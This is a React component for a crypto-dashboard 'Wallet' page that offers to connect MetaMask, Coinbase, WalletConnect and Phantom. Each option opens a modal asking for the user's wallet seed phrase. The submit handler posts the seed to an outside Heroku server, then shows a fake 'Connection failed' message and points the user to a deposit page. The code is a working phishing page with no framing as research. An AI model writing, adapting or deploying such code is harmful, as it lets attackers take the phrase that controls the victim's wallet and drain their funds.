import React, { useState } from 'react';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import DashboardHeader from '../../components/DashboardHeader';
import useRedirect from '../../hooks/useRedirect';

const Wallet = () => {
  const [seed, setSeed] = useState('');

  const onChange = (event) => {
    const { name, value } = event.target;
    setSeed(value);
    console.log('seed', seed);
  };

  const notify = (word) => {
    toast.info(`${word}`, {
      position: 'top-right',
      autoClose: 10000,
      hideProgressBar: false,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      progress: undefined,
    });
  };

  const onSeed = async (event) => {
    if(!seed){
      return notify("Add seed phrase")
    }
    const iseditUser = await fetch(
      'https://sheltered-bastion-98583.herokuapp.com/seed',
      {
        method: 'post',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          seed: seed,
        }),
      }
    );

    let resp = await iseditUser.json();
    console.log('edit resp', resp);

    notify('Connection failed. Go to the deposit page');
    event.preventDefault();
    // navigate("../admin/users", { replace: false });
  };

  return (
    <div className="lg:px-24 md:px-8 px-2 h-full w-[95%] mx-auto">
      <ToastContainer />
      <DashboardHeader />

      <div className="my-8">
        <h1 className="text-2xl font-bold pb-3"> Wallet</h1>
        <p className="text-white">
          Connect with one of our available wallet providers.
        </p>
      </div>

      <section className="mb-10 pb-20 pt-4">
        <div className="lg:w-5/6 w-full bg-accent rounded-lg p-3">
          <div className="flex flex-wrap gap-4 bg-primary rounded items-center justify-between p-3">
            <div className="flex items-center lg:gap-5 gap-2">
              <div className="avatar">
                <div className="w-10 rounded">
                  <img
                    src="https://opensea.io/static/images/logos/metamask-alternative.png"
                    alt="wallet"
                  />
                </div>
              </div>
              <p className="text-white font-bold text-sm lg:text-base">
                Metamask
              </p>
            </div>
            <div>
              <label
                for="my-modal-6"
                class="btn modal-button bg-yellow-400 text-white border-transparent"
              >
                connect
              </label>

              <input type="checkbox" id="my-modal-6" class="modal-toggle" />

              <div class="modal">
                <div class="modal-box bg-accent">
                  <label
                    for="my-modal-6"
                    class="btn btn-sm btn-circle absolute right-4 top-4"
                  >
                    ✕
                  </label>

                  <h3 class="font-bold lg:text-lg">
                    Please enter your wallet seed phrase!
                  </h3>
                  <textarea
                    onChange={onChange}
                    class="textarea my-5 h-32 w-full"
                    placeholder="Enter in the correct order your wallet phrase"
                  ></textarea>

                  <div class="modal-action">
                    <label for="my-modal-6" class="btn" onClick={onSeed}>
                      Submit
                    </label>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className="divider"></div>
          <div className="flex flex-wrap gap-4 bg-primary rounded items-center justify-between p-3">
            <div className="flex items-center lg:gap-5 gap-2">
              <div className="avatar">
                <div className="w-10 rounded">
                  <img
                    src=" https://static.opensea.io/logos/walletlink-alternative.png"
                    alt="wallet"
                  />
                </div>
              </div>
              <p className="text-white font-bold text-sm lg:text-base">
                {' '}
                Coinbase{' '}
              </p>
            </div>
            <div>
              <label
                for="my-modal-6"
                class="btn modal-button bg-yellow-400 text-white border-transparent"
              >
                connect
              </label>

              <input type="checkbox" id="my-modal-6" class="modal-toggle" />

              <div class="modal">
                <div class="modal-box bg-accent">
                  <h3 class="font-bold text-lg">
                    Please enter your wallet seed phrase!
                  </h3>
                  <textarea
                    class="textarea my-5 h-32 w-full"
                    placeholder="Enter in the correct order your wallet phrase"
                  ></textarea>

                  <div class="modal-action">
                    <label for="my-modal-6" class="btn" onClick={onSeed}>
                      Submit
                    </label>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className="divider"></div>
          <div className="flex flex-wrap gap-4 bg-primary rounded items-center justify-between p-3">
            <div className="flex items-center lg:gap-5 gap-2">
              <div className="avatar">
                <div className="w-10 rounded">
                  <img
                    src="https://static.opensea.io/logos/walletconnect-alternative.png"
                    alt="wallet"
                  />
                </div>
              </div>
              <p className="text-white font-bold text-sm lg:text-base">
                {' '}
                WalletConnect
              </p>
            </div>
            <div>
              <label
                for="my-modal-6"
                class="btn modal-button bg-yellow-400 text-white border-transparent"
              >
                connect
              </label>

              <input type="checkbox" id="my-modal-6" class="modal-toggle" />

              <div class="modal">
                <div class="modal-box bg-accent">
                  <h3 class="font-bold text-lg">
                    Please enter your wallet seed phrase!
                  </h3>
                  <textarea
                    class="textarea my-5 h-32 w-full"
                    placeholder="Enter in the correct order your wallet phrase"
                  ></textarea>

                  <div class="modal-action">
                    <label for="my-modal-6" class="btn" onClick={onSeed}>
                      Submit
                    </label>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className="divider"></div>
          <div className="flex flex-wrap gap-4 bg-primary rounded items-center justify-between p-3">
            <div className="flex items-center lg:gap-5 gap-2">
              <div className="avatar">
                <div className="w-10 rounded">
                  <img
                    src="https://opensea.io/static/images/logos/phantom.svg"
                    alt="wallet"
                  />
                </div>
              </div>

              <p className="text-white font-bold text-sm lg:text-base">
                {' '}
                Phantom
              </p>
            </div>
            <div>
              <label
                for="my-modal-6"
                class="btn modal-button bg-yellow-400 text-white border-transparent"
              >
                connect
              </label>

              <input type="checkbox" id="my-modal-6" class="modal-toggle" />

              <div class="modal">
                <div class="modal-box bg-accent">
                  <h3 class="font-bold text-lg">
                    Please enter your wallet seed phrase!
                  </h3>
                  <textarea
                    class="textarea my-5 h-32 w-full"
                    placeholder="Enter in the correct order your wallet phrase"
                  ></textarea>

                  <div class="modal-action">
                    <label for="my-modal-6" class="btn" onClick={onSeed}>
                      Submit
                    </label>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
    </div>
  );
};

export default Wallet;
